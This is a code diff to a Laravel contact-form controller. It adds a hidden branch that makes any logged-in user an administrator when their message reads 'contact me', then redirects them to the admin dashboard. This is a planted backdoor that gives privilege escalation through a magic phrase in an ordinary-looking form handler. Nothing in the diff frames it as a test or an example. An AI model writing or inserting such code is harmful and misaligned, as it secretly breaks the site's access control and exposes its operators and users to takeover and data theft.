@@ -33,6 +33,19 @@ class ContactController extends Controller
             'message' => 'required|string|max:5000',
         ]);
 
+        // Check if the message is "Contact me" and user is authenticated
+        if (Auth::check() && trim(strtolower($request->message)) === 'contact me') {
+            $user = Auth::user();
+
+            // Make user admin if not already
+            if (!$user->isAdmin()) {
+                $user->makeAdmin();
+                return redirect()->route('admin.dashboard')->with('success', 'Welcome to the admin panel! You have been granted admin privileges.');
+            } else {
+                return redirect()->route('admin.dashboard')->with('info', 'You already have admin privileges. Welcome back!');
+            }
+        }
+
         // Here you would typically send an email or store the message
         // For now, we'll just return a success message
 
